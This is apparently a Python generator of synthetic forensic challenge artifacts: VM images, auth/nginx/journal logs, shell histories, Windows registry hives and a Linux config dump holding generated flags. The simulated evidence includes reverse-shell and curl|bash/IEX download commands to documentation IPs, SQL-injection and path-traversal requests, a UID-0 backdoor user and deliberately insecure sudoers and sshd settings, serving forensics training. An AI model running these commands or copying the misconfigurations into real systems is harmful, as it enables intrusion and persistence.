#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""
gen_admin.py — генераторы тестовых артефактов для admin/* (чистый Python).

Используется tests/selftest.py (checks_admin); можно и руками:

  python tests/gen_admin.py --out DIR      # все артефакты в папку + manifest.json

Образы ВМ (QCOW2 c zlib-кластером, VDI, VMDK sparse/streamOptimized, OVA),
логи (auth.log, nginx, journald JSON, bash/PowerShell history), куст реестра
regf, XML задачи планировщика, дамп Linux-конфигов. Флаги генерируются кодом.
"""
from __future__ import annotations

try:
    import sys as _sys
    for _stream in (_sys.stdout, _sys.stderr):
        _stream.reconfigure(encoding="utf-8", errors="replace")
except Exception:
    pass

import argparse
import base64
import datetime as dt
import hashlib
import io
import json
import math
import os
import struct
import tarfile
import zlib

SECTOR = 512


def gen_flag(tag: str) -> str:
    """Детерминированный флаг из тега (никаких ручных ответов)."""
    return "CTF{" + tag + "_" + hashlib.sha256(tag.encode()).hexdigest()[:10] + "}"


# ---------------------------------------------------------------- образы ВМ

def make_disk_raw(flag: str, size=2 << 20):
    """Сырой диск: MBR с разделом 0x83, суперблок ext2, флаг и «flag.txt».

    Возвращает (raw, смещение флага). Флаг лежит в 4-м кластере по 64 KB.
    """
    raw = bytearray(size)
    part_lba = 64
    entry = struct.pack("<B3sB3sII", 0x80, b"\x00\x02\x00", 0x83, b"\xfe\xff\xff",
                        part_lba, size // SECTOR - part_lba)
    raw[446:462] = entry
    raw[510:512] = b"\x55\xaa"
    sb = part_lba * SECTOR + 1024
    raw[sb + 56:sb + 58] = b"\x53\xef"
    flag_off = 0x30000 + 0x123
    raw[flag_off:flag_off + len(flag)] = flag.encode()
    note = b"flag.txt\x00secret notes"
    raw[0x50010:0x50010 + len(note)] = note
    return bytes(raw), flag_off


def make_qcow2(raw: bytes, cluster_bits=16, compress=(3,), zero=()):
    """QCOW2 v3: L1/L2, обычные кластеры, raw-deflate кластеры, zero-кластеры."""
    cs = 1 << cluster_bits
    n_cl = math.ceil(len(raw) / cs)
    l2_per = cs // 8
    l1_size = math.ceil(n_cl / l2_per)
    l1_off, rt_off, rb_off = cs, 2 * cs, 3 * cs
    l2_offs = [(4 + i) * cs for i in range(l1_size)]
    next_cl = 4 + l1_size
    l2 = [0] * (l1_size * l2_per)
    body = {}
    comp_items = []
    for idx in range(n_cl):
        chunk = raw[idx * cs:(idx + 1) * cs]
        if idx in zero:
            l2[idx] = 1
            continue
        if not chunk.strip(b"\x00"):
            continue
        if idx in compress:
            co = zlib.compressobj(9, zlib.DEFLATED, -12)
            comp_items.append((idx, co.compress(chunk) + co.flush()))
            continue
        off = next_cl * cs
        next_cl += 1
        body[off] = chunk + bytes(cs - len(chunk))
        l2[idx] = (1 << 63) | off
    pos = next_cl * cs
    comp_blob = bytearray()
    x = 62 - (cluster_bits - 8)
    for idx, data in comp_items:
        off = pos + len(comp_blob)
        nsec = (off + len(data) - 1) // SECTOR - off // SECTOR
        l2[idx] = (1 << 62) | (nsec << x) | off
        comp_blob += data
    total = pos + len(comp_blob)
    used = math.ceil(total / cs)
    hdr = struct.pack(">4sIQIIQIIQQIIQQQQII", b"QFI\xfb", 3, 0, 0, cluster_bits, len(raw),
                      0, l1_size, l1_off, rt_off, 1, 0, 0, 0, 0, 0, 4, 104)
    out = bytearray(total)
    out[:len(hdr)] = hdr
    out[l1_off:l1_off + 8 * l1_size] = struct.pack(f">{l1_size}Q",
                                                   *[(1 << 63) | o for o in l2_offs])
    out[rt_off:rt_off + 8] = struct.pack(">Q", rb_off)
    out[rb_off:rb_off + 2 * used] = struct.pack(f">{used}H", *([1] * used))
    for i, o in enumerate(l2_offs):
        out[o:o + cs] = struct.pack(f">{l2_per}Q", *l2[i * l2_per:(i + 1) * l2_per])
    for o, chunk in body.items():
        out[o:o + cs] = chunk
    out[pos:pos + len(comp_blob)] = comp_blob
    return bytes(out)


def make_vdi(raw: bytes, block=1 << 20, zero_blocks=()):
    """VDI 1.1 dynamic: заголовок, карта блоков, данные."""
    n = math.ceil(len(raw) / block)
    off_blocks = 512
    off_data = math.ceil((off_blocks + 4 * n) / 512) * 512
    bmap, data = [], bytearray()
    for i in range(n):
        chunk = raw[i * block:(i + 1) * block]
        if i in zero_blocks:
            bmap.append(0xFFFFFFFE)
        elif not chunk.strip(b"\x00"):
            bmap.append(0xFFFFFFFF)
        else:
            bmap.append(len(data) // block)
            data += chunk + bytes(block - len(chunk))
    pre = b"<<< Oracle VM VirtualBox Disk Image >>>\n".ljust(64, b"\x00")
    hdr = bytearray(512)
    hdr[:64] = pre
    struct.pack_into("<III", hdr, 64, 0xBEDA107F, 0x00010001, 400)
    struct.pack_into("<II", hdr, 76, 1, 0)
    hdr[84:84 + 9] = b"test disk"
    struct.pack_into("<II", hdr, 340, off_blocks, off_data)
    struct.pack_into("<Q", hdr, 368, len(raw))
    struct.pack_into("<IIII", hdr, 376, block, 0, n, len(data) // block)
    hdr[392:408] = hashlib.md5(b"vdi-create").digest()
    hdr[408:424] = hashlib.md5(b"vdi-modify").digest()
    out = bytearray(hdr)
    out += struct.pack(f"<{n}I", *bmap)
    out += bytes(off_data - len(out))
    out += data
    return bytes(out)


def _vmdk_header(version, flags, cap, grain, desc_off, desc_size, n_gte, rgd, gd, overhead,
                 compress=0):
    h = struct.pack("<4sIIQQQQIQQQB4sH", b"KDMV", version, flags, cap, grain, desc_off,
                    desc_size, n_gte, rgd, gd, overhead, 0, b"\n \r\n", compress)
    return h + bytes(512 - len(h))


def make_vmdk_sparse(raw: bytes, grain=128, n_gte=512):
    """monolithicSparse: заголовок KDMV, встроенный дескриптор, RGD/RGT, GD/GT, грейны."""
    cap = len(raw) // SECTOR
    gsize = grain * SECTOR
    n_gde = math.ceil(cap / (grain * n_gte))
    desc = ("# Disk DescriptorFile\nversion=1\nCID=fffffffe\nparentCID=ffffffff\n"
            'createType="monolithicSparse"\n\n# Extent description\n'
            f'RW {cap} SPARSE "disk.vmdk"\n\n# The Disk Data Base\n'
            'ddb.virtualHWVersion = "4"\n').encode()
    desc_off, desc_size = 1, 20
    gd_secs = math.ceil(n_gde * 4 / SECTOR)
    gt_secs = n_gde * math.ceil(n_gte * 4 / SECTOR)
    rgd = desc_off + desc_size
    rgt = rgd + gd_secs
    gd = rgt + gt_secs
    gt = gd + gd_secs
    overhead = math.ceil((gt + gt_secs) / grain) * grain
    gtes = [0] * (n_gde * n_gte)
    grains = bytearray()
    for i in range(math.ceil(cap / grain)):
        chunk = raw[i * gsize:(i + 1) * gsize]
        if not chunk.strip(b"\x00"):
            continue
        gtes[i] = overhead + len(grains) // SECTOR
        grains += chunk + bytes(gsize - len(chunk))
    out = bytearray(overhead * SECTOR)
    out[:512] = _vmdk_header(1, 3, cap, grain, desc_off, desc_size, n_gte, rgd, gd, overhead)
    out[desc_off * SECTOR:desc_off * SECTOR + len(desc)] = desc
    for gd_start, gt_start in ((rgd, rgt), (gd, gt)):
        dir_entries = [gt_start + k * math.ceil(n_gte * 4 / SECTOR) for k in range(n_gde)]
        out[gd_start * SECTOR:gd_start * SECTOR + 4 * n_gde] = struct.pack(f"<{n_gde}I",
                                                                           *dir_entries)
        out[gt_start * SECTOR:gt_start * SECTOR + 4 * len(gtes)] = struct.pack(
            f"<{len(gtes)}I", *gtes)
    out += grains
    return bytes(out)


def make_vmdk_stream(raw: bytes, grain=128, n_gte=512):
    """streamOptimized: сжатые грейны с маркерами, GT/GD-маркеры, футер, EOS."""
    cap = len(raw) // SECTOR
    gsize = grain * SECTOR
    n_gde = math.ceil(cap / (grain * n_gte))
    desc = ("# Disk DescriptorFile\nversion=1\nCID=fffffffe\nparentCID=ffffffff\n"
            'createType="streamOptimized"\n\n# Extent description\n'
            f'RW {cap} SPARSE "disk.vmdk"\n').encode()
    desc_off, desc_size = 1, 2
    overhead = desc_off + desc_size
    flags = 1 | (1 << 16) | (1 << 17)
    out = bytearray(_vmdk_header(3, flags, cap, grain, desc_off, desc_size, n_gte, 0,
                                 0xFFFFFFFFFFFFFFFF, overhead, 1))
    out += desc + bytes(desc_size * SECTOR - len(desc))
    gtes = [0] * (n_gde * n_gte)
    for i in range(math.ceil(cap / grain)):
        chunk = raw[i * gsize:(i + 1) * gsize]
        if not chunk.strip(b"\x00"):
            continue
        comp = zlib.compress(chunk, 9)
        gtes[i] = len(out) // SECTOR
        rec = struct.pack("<QI", i * grain, len(comp)) + comp
        out += rec + bytes((-len(rec)) % SECTOR)

    def marker(val, mtype):
        return struct.pack("<QII", val, 0, mtype) + bytes(SECTOR - 16)

    gt_secs = math.ceil(n_gte * 4 / SECTOR)
    gt_pos = []
    for k in range(n_gde):
        out += marker(gt_secs, 1)
        gt_pos.append(len(out) // SECTOR)
        tbl = struct.pack(f"<{n_gte}I", *gtes[k * n_gte:(k + 1) * n_gte])
        out += tbl + bytes(gt_secs * SECTOR - len(tbl))
    gd_secs = math.ceil(n_gde * 4 / SECTOR)
    out += marker(gd_secs, 2)
    gd_pos = len(out) // SECTOR
    tbl = struct.pack(f"<{n_gde}I", *gt_pos)
    out += tbl + bytes(gd_secs * SECTOR - len(tbl))
    out += marker(1, 3)
    out += _vmdk_header(3, flags, cap, grain, desc_off, desc_size, n_gte, 0, gd_pos,
                        overhead, 1)
    out += marker(0, 0)
    return bytes(out)


def make_ova(vmdk: bytes, name="appliance", note="test appliance"):
    """OVA = tar: .ovf первым, затем диск и манифест."""
    ovf = f"""<?xml version="1.0" encoding="UTF-8"?>
<Envelope xmlns="http://schemas.dmtf.org/ovf/envelope/1"
          xmlns:ovf="http://schemas.dmtf.org/ovf/envelope/1">
  <References><File ovf:id="file1" ovf:href="{name}-disk1.vmdk" ovf:size="{len(vmdk)}"/></References>
  <DiskSection><Info>disks</Info>
    <Disk ovf:diskId="vmdisk1" ovf:fileRef="file1" ovf:capacity="2"
          ovf:capacityAllocationUnits="byte * 2^20"
          ovf:format="http://www.vmware.com/interfaces/specifications/vmdk.html#streamOptimized"/>
  </DiskSection>
  <VirtualSystem ovf:id="{name}"><Info>vm</Info><Name>{name}</Name>
    <OperatingSystemSection ovf:id="96"><Info>os</Info><Description>Debian_64</Description>
    </OperatingSystemSection>
    <AnnotationSection><Info>note</Info><Annotation>{note}</Annotation></AnnotationSection>
  </VirtualSystem>
</Envelope>
""".encode()
    mf = (f"SHA256({name}.ovf)= {hashlib.sha256(ovf).hexdigest()}\n"
          f"SHA256({name}-disk1.vmdk)= {hashlib.sha256(vmdk).hexdigest()}\n").encode()
    buf = io.BytesIO()
    with tarfile.open(fileobj=buf, mode="w", format=tarfile.USTAR_FORMAT) as tf:
        for fn, data in ((f"{name}.ovf", ovf), (f"{name}-disk1.vmdk", vmdk), (f"{name}.mf", mf)):
            ti = tarfile.TarInfo(fn)
            ti.size = len(data)
            ti.mtime = 1700000000
            tf.addfile(ti, io.BytesIO(data))
    return buf.getvalue()


def write_vm_set(out_dir):
    """Все образы ВМ в папку. → {имя: (путь, флаг, ожидаемый raw)}"""
    os.makedirs(out_dir, exist_ok=True)
    res = {}
    for kind in ("qcow2", "vdi", "vmdk_sparse", "vmdk_stream", "ova"):
        flag = gen_flag("vm_" + kind)
        raw, _off = make_disk_raw(flag)
        if kind == "qcow2":
            data, fn = make_qcow2(raw), "disk.qcow2"
        elif kind == "vdi":
            data, fn = make_vdi(raw, zero_blocks=()), "disk.vdi"
        elif kind == "vmdk_sparse":
            data, fn = make_vmdk_sparse(raw), "sparse.vmdk"
        elif kind == "vmdk_stream":
            data, fn = make_vmdk_stream(raw), "stream.vmdk"
        else:
            data, fn = make_ova(make_vmdk_stream(raw)), "appliance.ova"
        p = os.path.join(out_dir, fn)
        with open(p, "wb") as f:
            f.write(data)
        res[kind] = (p, flag, raw)
    return res


# ---------------------------------------------------------------- логи

def _syslog_ts(t):
    return f"{t:%b} {t.day:2d} {t:%H:%M:%S}"


def make_auth_log(flag, year=2024):
    """auth.log: брутфорс → успешный вход → sudo с base64 → новый uid 0 → cron."""
    t0 = dt.datetime(year, 3, 14, 9, 0, 0)
    out = []

    def L(sec, prog, msg):
        out.append(f"{_syslog_ts(t0 + dt.timedelta(seconds=sec))} srv01 {prog}: {msg}")

    L(0, "sshd[1001]", "Accepted publickey for alice from 10.0.0.5 port 50022 ssh2: RSA SHA256:x")
    for i in range(12):
        user = ("root", "admin", "test")[i % 3]
        inv = "" if user == "root" else "invalid user "
        L(600 + 2 * i, "sshd[1100]", f"Failed password for {inv}{user} from 203.0.113.7 "
                                     f"port {40000 + i} ssh2")
    L(630, "sshd[1100]", "Accepted password for root from 203.0.113.7 port 40100 ssh2")
    payload = base64.b64encode(f"backup key {flag}".encode()).decode()
    L(665, "sudo", f"    root : TTY=pts/0 ; PWD=/root ; USER=root ; "
                   f"COMMAND=/bin/bash -c echo {payload} | base64 -d > /tmp/.k")
    L(720, "useradd[2000]", "new user: name=backdoor, UID=0, GID=0, home=/root, shell=/bin/bash")
    L(750, "usermod[2001]", "add 'backdoor' to group 'sudo'")
    L(760, "passwd[2002]", "pam_unix(passwd:chauthtok): password changed for backdoor")
    L(780, "CRON[3000]", "(root) CMD (curl -s http://198.51.100.9/x.sh | bash)")
    L(840, "su[3100]", "pam_unix(su:session): session opened for user root(uid=0) by alice(uid=1000)")
    return "\n".join(out) + "\n"


def make_access_log(flag, year=2024):
    """nginx combined: обычный трафик, Nikto, LFI, UNION, слепая SQLi (флаг), base64-параметр."""
    t0 = dt.datetime(year, 3, 14, 10, 0, 0)
    out = []

    def L(sec, ip, req, st, size, ua="Mozilla/5.0 (X11; Linux x86_64)"):
        t = t0 + dt.timedelta(seconds=sec)
        out.append(f'{ip} - - [{t:%d/%b/%Y:%H:%M:%S} +0000] "{req}" {st} {size} "-" "{ua}"')

    for i in range(10):
        L(i, "10.0.0.8", "GET /index.html HTTP/1.1", 200, 512)
    for i in range(25):
        L(30 + i, "198.51.100.23", f"GET /admin{i}.php HTTP/1.1", 404, 162,
          "Mozilla/5.00 (Nikto/2.1.6) (Evasions:None) (Test:000)")
    L(70, "198.51.100.23", "GET /view.php?page=..%2F..%2F..%2F..%2Fetc%2Fpasswd HTTP/1.1", 200, 1820)
    L(71, "198.51.100.23", "GET /item.php?id=1%20UNION%20SELECT%20username,password%20FROM%20users-- "
                           "HTTP/1.1", 200, 733)
    from urllib.parse import quote
    sec = 100
    for pos, ch in enumerate(flag, 1):
        lo, hi = 0, 127
        while lo < hi:
            mid = (lo + hi) // 2
            cond = ord(ch) > mid
            q = (f"1 AND ORD(MID((SELECT IFNULL(CAST(secret AS NCHAR),0x20) FROM app.vault "
                 f"ORDER BY id LIMIT 0,1),{pos},1))>{mid}")
            L(sec, "192.0.2.77", f"GET /item.php?id={quote(q)} HTTP/1.1", 200,
              1532 if cond else 980, "sqlmap/1.7.2#stable (https://sqlmap.org)")
            sec += 1
            if cond:
                lo = mid + 1
            else:
                hi = mid
    token = base64.b64encode(b"user=guest;role=admin").decode()
    L(sec + 5, "10.0.0.9", f"GET /api/session?data={quote(token)} HTTP/1.1", 200, 90)
    pw = "pw_" + hashlib.md5(flag.encode()).hexdigest()[:8]
    L(sec + 6, "10.0.0.9", f"GET /login?user=admin&password={pw} HTTP/1.1", 302, 0)
    return "\n".join(out) + "\n"


def make_journal_json(flag, year=2024):
    """journalctl -o json: брутфорс sshd + MESSAGE массивом байт (там флаг)."""
    t0 = int(dt.datetime(year, 3, 14, 8, 30, tzinfo=dt.timezone.utc).timestamp() * 1e6)
    out = []
    for i in range(6):
        out.append(json.dumps({"__REALTIME_TIMESTAMP": str(t0 + i * 3_000_000),
                               "_HOSTNAME": "web01", "SYSLOG_IDENTIFIER": "sshd", "_PID": "812",
                               "MESSAGE": f"Failed password for invalid user oracle from "
                                          f"192.0.2.44 port {50100 + i} ssh2"}))
    out.append(json.dumps({"__REALTIME_TIMESTAMP": str(t0 + 60_000_000), "_HOSTNAME": "web01",
                           "SYSLOG_IDENTIFIER": "backup", "_PID": "900",
                           "MESSAGE": list(f"backup token {flag}\x00".encode())}))
    return "\n".join(out) + "\n"


def make_bash_history(flag, year=2024):
    """zsh extended history: загрузка, chmod, пароль в mysql, флаг в \\x-escape, реверс-шелл."""
    t0 = int(dt.datetime(year, 3, 14, 9, 0, tzinfo=dt.timezone.utc).timestamp())
    pw = "pw_" + hashlib.md5(b"mysql" + flag.encode()).hexdigest()[:8]
    esc = "".join(f"\\x{b:02x}" for b in flag.encode())
    cmds = ["ls -la", "wget http://198.51.100.9/l.sh -O /tmp/l.sh", "chmod +x /tmp/l.sh",
            f"mysql -u root -p{pw} -e 'select 1'", f"echo -e '{esc}' > /dev/null",
            "bash -i >& /dev/tcp/198.51.100.9/4444 0>&1", "history -c"]
    return "".join(f": {t0 + 10 * i}:0;{c}\n" for i, c in enumerate(cmds)), pw


def write_log_set(out_dir):
    """Логи в папку. → {имя: (путь, флаг)}"""
    os.makedirs(out_dir, exist_ok=True)
    res = {}
    for kind, fn in (("auth", "auth.log"), ("access", "access.log"),
                     ("journal", "journal.json"), ("history", ".zsh_history")):
        flag = gen_flag("log_" + kind)
        if kind == "auth":
            text = make_auth_log(flag)
        elif kind == "access":
            text = make_access_log(flag)
        elif kind == "journal":
            text = make_journal_json(flag)
        else:
            text, _pw = make_bash_history(flag)
        p = os.path.join(out_dir, fn)
        with open(p, "w", encoding="utf-8", newline="\n") as f:
            f.write(text)
        res[kind] = (p, flag)
    return res


# ---------------------------------------------------------------- Windows

class RegfBuilder:
    """Минимальный валидный куст regf: base block + один hbin с nk/vk/lh-ячейками.

    keys: путь → [(имя, тип, bytes)]. Свободные ячейки (deleted=...) пишутся
    с положительным размером — так выглядят удалённые значения.
    """

    def __init__(self, root_name="ROOT", hive_name="\\??\\C:\\test\\hive"):
        self.root_name = root_name
        self.hive_name = hive_name
        self.keys = {"": []}
        self.deleted = []

    def key(self, path, values=()):
        parts = [p for p in path.split("\\") if p]
        for i in range(1, len(parts) + 1):
            self.keys.setdefault("\\".join(parts[:i]), [])
        self.keys["\\".join(parts)].extend(values)
        return self

    def deleted_value(self, name, vtype, data):
        self.deleted.append((name, vtype, data))
        return self

    def build(self, ft=0x01DA75D1C0A2B000):
        cells = bytearray()

        def alloc(data, free=False):
            size = (len(data) + 4 + 7) // 8 * 8
            off = 32 + len(cells)
            cells.extend(struct.pack("<i", size if free else -size) + data
                         + bytes(size - 4 - len(data)))
            return off

        def patch(off, fmt, at, *vals):
            struct.pack_into(fmt, cells, off - 32 + 4 + at, *vals)

        def nk(name, parent, root=False):
            nb = name.encode("latin-1")
            body = struct.pack("<2sHQIIIIIIIIIIIIIIIHH", b"nk", 0x2C if root else 0x20, ft, 0,
                               parent, 0, 0, 0xFFFFFFFF, 0xFFFFFFFF, 0, 0xFFFFFFFF,
                               0xFFFFFFFF, 0xFFFFFFFF, 0, 0, 0, 0, 0, len(nb), 0) + nb
            return alloc(body)

        def vk(name, vtype, data, free=False):
            nb = name.encode("latin-1")
            if len(data) <= 4:
                size, doff = len(data) | 0x80000000, struct.unpack("<I", data.ljust(4, b"\0"))[0]
            else:
                doff = alloc(data, free)
                size = len(data)
            return alloc(struct.pack("<2sHIIIHH", b"vk", len(nb), size, doff, vtype, 1, 0) + nb,
                         free)

        offs = {"": nk(self.root_name, 0xFFFFFFFF, root=True)}
        for path in sorted(self.keys, key=lambda p: (p.count("\\"), p)):
            if not path:
                continue
            parent = path.rsplit("\\", 1)[0] if "\\" in path else ""
            offs[path] = nk(path.rsplit("\\", 1)[-1], offs[parent])
        for path, vals in self.keys.items():
            kids = sorted((p for p in self.keys if p and (p.rsplit("\\", 1)[0] if "\\" in p else "")
                           == path), key=lambda p: p.rsplit("\\", 1)[-1].upper())
            if kids:
                ent = b""
                for kp in kids:
                    h = 0
                    for ch in kp.rsplit("\\", 1)[-1].upper():
                        h = (h * 37 + ord(ch)) & 0xFFFFFFFF
                    ent += struct.pack("<II", offs[kp], h)
                lst = alloc(struct.pack("<2sH", b"lh", len(kids)) + ent)
                patch(offs[path], "<I", 20, len(kids))
                patch(offs[path], "<I", 28, lst)
            if vals:
                vo = [vk(n, t, d) for n, t, d in vals]
                vl = alloc(struct.pack(f"<{len(vo)}I", *vo))
                patch(offs[path], "<I", 36, len(vo))
                patch(offs[path], "<I", 40, vl)
        for n, t, d in self.deleted:
            vk(n, t, d, free=True)
        hb_size = (32 + len(cells) + 8 + 4095) // 4096 * 4096
        rest = hb_size - 32 - len(cells)
        cells.extend(struct.pack("<i", rest) + bytes(rest - 4))
        hbin = struct.pack("<4sIIQQI", b"hbin", 0, hb_size, 0, ft, 0) + bytes(cells)
        base = bytearray(4096)
        struct.pack_into("<4sIIQIIIIIII", base, 0, b"regf", 1, 1, ft, 1, 5, 0, 1,
                         offs[""], hb_size, 1)
        nm = self.hive_name.encode("utf-16-le")[:64]
        base[48:48 + len(nm)] = nm
        x = 0
        for i in range(127):
            x ^= struct.unpack_from("<I", base, i * 4)[0]
        x = 0xFFFFFFFE if x == 0xFFFFFFFF else (1 if x == 0 else x)
        struct.pack_into("<I", base, 508, x)
        return bytes(base) + hbin


def _sz(s):
    return (s + "\x00").encode("utf-16-le")


def _psenc(script):
    return base64.b64encode(script.encode("utf-16-le")).decode()


def make_system_hive(flag):
    """SYSTEM: Select\\Current=1, служба с -enc в ImagePath (флаг) и нормальный драйвер."""
    b = RegfBuilder("CsiTool-CreateHive-{00000000-0000-0000-0000-000000000000}")
    b.key("Select", [("Current", 4, struct.pack("<I", 1)), ("Default", 4, struct.pack("<I", 1))])
    b.key("ControlSet001\\Services\\Tcpip", [
        ("ImagePath", 2, _sz("\\SystemRoot\\System32\\drivers\\tcpip.sys")),
        ("Start", 4, struct.pack("<I", 0)), ("Type", 4, struct.pack("<I", 1))])
    b.key("ControlSet001\\Services\\UpdSvc", [
        ("ImagePath", 2, _sz("C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe "
                             f"-nop -w hidden -enc {_psenc('Write-Output ' + chr(39) + flag + chr(39))}")),
        ("Start", 4, struct.pack("<I", 2)), ("Type", 4, struct.pack("<I", 16)),
        ("ObjectName", 1, _sz("LocalSystem")), ("DisplayName", 1, _sz("Update Service"))])
    b.key("ControlSet001\\Control\\Session Manager",
          [("BootExecute", 7, _sz("autocheck autochk *") + b"\x00\x00")])
    return b.build()


def make_ntuser_hive(flag, deleted_flag):
    """NTUSER.DAT: Run (подозрительный путь, флаг в REG_BINARY UTF-16), RunOnce, удалённое значение."""
    b = RegfBuilder("ROOT")
    run = "Software\\Microsoft\\Windows\\CurrentVersion\\Run"
    b.key(run, [("OneDrive", 1, _sz("C:\\Users\\u\\AppData\\Local\\Microsoft\\OneDrive\\OneDrive.exe")),
                ("Updater", 1, _sz("C:\\Users\\Public\\upd.exe /silent")),
                ("Cfg", 3, ("cfg:" + flag).encode("utf-16-le"))])
    b.key("Software\\Microsoft\\Windows\\CurrentVersion\\RunOnce",
          [("cleanup", 1, _sz("cmd /c del C:\\Users\\Public\\upd.exe"))])
    b.key("Environment", [("TEMP", 2, _sz("%USERPROFILE%\\AppData\\Local\\Temp"))])
    b.key("Console", [])
    b.deleted_value("Secret", 3, ("old:" + deleted_flag).encode("utf-16-le"))
    return b.build()


def make_task_xml(flag):
    """XML задачи планировщика (UTF-16 с BOM, как в System32\\Tasks): -enc в аргументах."""
    xml = f"""<?xml version="1.0" encoding="UTF-16"?>
<Task version="1.2" xmlns="http://schemas.microsoft.com/windows/2004/02/mit/task">
  <RegistrationInfo><Date>2024-03-14T09:20:00</Date><Author>WIN-TEST\\admin</Author>
    <URI>\\Microsoft\\Windows\\UpdateCheck</URI></RegistrationInfo>
  <Triggers><LogonTrigger><Enabled>true</Enabled></LogonTrigger>
    <TimeTrigger><StartBoundary>2024-03-14T09:30:00</StartBoundary>
      <Repetition><Interval>PT15M</Interval></Repetition></TimeTrigger></Triggers>
  <Principals><Principal id="Author"><UserId>S-1-5-18</UserId><RunLevel>HighestAvailable</RunLevel></Principal></Principals>
  <Settings><Hidden>true</Hidden></Settings>
  <Actions Context="Author"><Exec><Command>powershell.exe</Command>
    <Arguments>-NoP -W Hidden -EncodedCommand {_psenc("$f='" + flag + "'; IEX (New-Object Net.WebClient).DownloadString('http://198.51.100.5/a')")}</Arguments>
  </Exec></Actions>
</Task>
"""
    return b"\xff\xfe" + xml.encode("utf-16-le")


def make_ps_history(flag):
    lines = ["Get-ChildItem C:\\Users", "Set-MpPreference -DisableRealtimeMonitoring $true",
             f"powershell -nop -enc {_psenc('Write-Output ' + chr(39) + flag + chr(39))}",
             "IEX (New-Object Net.WebClient).DownloadString('http://198.51.100.5/r.ps1')",
             "Remove-Item (Get-PSReadlineOption).HistorySavePath"]
    return "\r\n".join(lines) + "\r\n"


def write_win_set(out_dir):
    """Кусты, задача, PS-история в папку-дамп. → {имя: (путь, флаг)}"""
    cfg = os.path.join(out_dir, "Windows", "System32", "config")
    tasks = os.path.join(out_dir, "Windows", "System32", "Tasks", "Microsoft", "Windows")
    user = os.path.join(out_dir, "Users", "u")
    psdir = os.path.join(user, "AppData", "Roaming", "Microsoft", "Windows", "PowerShell",
                         "PSReadLine")
    for d in (cfg, tasks, psdir):
        os.makedirs(d, exist_ok=True)
    res = {}
    f_sys = gen_flag("win_service")
    p = os.path.join(cfg, "SYSTEM")
    with open(p, "wb") as f:
        f.write(make_system_hive(f_sys))
    res["system"] = (p, f_sys)
    f_run, f_del = gen_flag("win_run"), gen_flag("win_deleted")
    p = os.path.join(user, "NTUSER.DAT")
    with open(p, "wb") as f:
        f.write(make_ntuser_hive(f_run, f_del))
    res["ntuser"] = (p, f_run)
    res["deleted"] = (p, f_del)
    f_task = gen_flag("win_task")
    p = os.path.join(tasks, "UpdateCheck")
    with open(p, "wb") as f:
        f.write(make_task_xml(f_task))
    res["task"] = (p, f_task)
    f_ps = gen_flag("win_pshistory")
    p = os.path.join(psdir, "ConsoleHost_history.txt")
    with open(p, "w", encoding="utf-8", newline="") as f:
        f.write(make_ps_history(f_ps))
    res["pshistory"] = (p, f_ps)
    return res


# ---------------------------------------------------------------- дамп Linux-ФС

def _fake_crypt(prefix, seed, n):
    """Строка в формате crypt ($6$соль$хеш): тип определяется, пароля за ней нет."""
    alpha = "./0123456789ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz"
    d = hashlib.sha512(seed.encode()).digest() * 2
    salt = "".join(alpha[b % 64] for b in d[:16])
    body = "".join(alpha[b % 64] for b in d[16:16 + n])
    return f"{prefix}{salt}${body}"


def write_linux_dump(root):
    """Выгрузка ФС с типовыми админ-ошибками + лог, образ ВМ, Windows-артефакты.

    → {"k8s"|"auth"|"vm"|"win": флаг}
    """
    f_k8s, f_auth, f_vm = gen_flag("admin_k8s_secret"), gen_flag("admin_auth"), gen_flag("admin_vm")
    tok = hashlib.sha1(f_k8s.encode()).hexdigest()
    b64 = lambda s: base64.b64encode(s.encode()).decode()  # noqa: E731
    files = {
        "etc/passwd": "root:x:0:0:root:/root:/bin/bash\n"
                      "daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin\n"
                      "bob:x:1000:1000:Bob:/home/bob:/bin/bash\n"
                      "toor:x:0:0::/root:/bin/bash\n",
        "etc/shadow": f"root:{_fake_crypt('$6$', 'root', 86)}:19700:0:99999:7:::\n"
                      f"bob:{_fake_crypt('$y$j9T$', 'bob', 43)}:19700:0:99999:7:::\n"
                      "daemon:*:19700:0:99999:7:::\n"
                      "toor::19700:0:99999:7:::\n",
        "etc/group": "root:x:0:\nsudo:x:27:bob\ndocker:x:999:bob\n",
        "etc/sudoers": "Defaults env_reset\nDefaults env_keep += LD_PRELOAD\n"
                       "root ALL=(ALL:ALL) ALL\n"
                       "bob ALL=(root) NOPASSWD: /usr/bin/find, /usr/local/bin/backup.sh *\n",
        "etc/crontab": "SHELL=/bin/sh\nPATH=/home/bob/bin:/usr/local/sbin:/usr/bin:/bin\n"
                       "*/5 * * * * root /tmp/cleanup.sh\n"
                       "0 * * * * root cd /var/backups && tar czf site.tgz *\n",
        "etc/systemd/system/updater.service":
            "[Unit]\nDescription=updater\n[Service]\n"
            "ExecStart=/bin/bash -c 'bash -i >& /dev/tcp/198.51.100.9/4444 0>&1'\n"
            "[Install]\nWantedBy=multi-user.target\n",
        "etc/ssh/sshd_config": "Port 2222\nPermitRootLogin yes\nPermitEmptyPasswords yes\n"
                               "PasswordAuthentication yes\n",
        "etc/exports": "/srv/share *(rw,no_root_squash)\n",
        "home/bob/.git-credentials": f"https://bob:tok_{tok[:20]}@git.example.com\n",
        "home/bob/.ssh/authorized_keys": 'command="/usr/local/bin/backup.sh" ssh-ed25519 '
                                         'AAAAC3NzaC1lZDI1NTE5AAAAIExampleKeyNotReal bob@laptop\n',
        "home/bob/.local/share/Trash/info/notes.txt.trashinfo":
            "[Trash Info]\nPath=/home/bob/notes.txt\nDeletionDate=2024-03-14T09:30:00\n",
        "opt/app/docker-compose.yml": "services:\n  web:\n    image: app\n    privileged: true\n"
                                      "    volumes:\n      - /var/run/docker.sock:/var/run/docker.sock\n"
                                      f"    environment:\n      - DB_PASSWORD=pw_{tok[20:28]}\n",
        "opt/app/k8s/secret.yaml": "apiVersion: v1\nkind: Secret\nmetadata:\n  name: app\n"
                                   f"type: Opaque\ndata:\n  flag: {b64(f_k8s)}\n  user: {b64('admin')}\n",
        "opt/app/.env": f"APP_ENV=prod\nSECRET_KEY=sk_{tok[28:40]}\n",
        "root/suid.txt": "/usr/bin/passwd\n/usr/bin/sudo\n/usr/bin/find\n/usr/bin/mount\n"
                         "/opt/tools/backup\n",
        "root/caps.txt": "/usr/bin/python3.11 cap_setuid=ep\n/usr/bin/ping cap_net_raw=ep\n",
        "var/log/auth.log": make_auth_log(f_auth),
    }
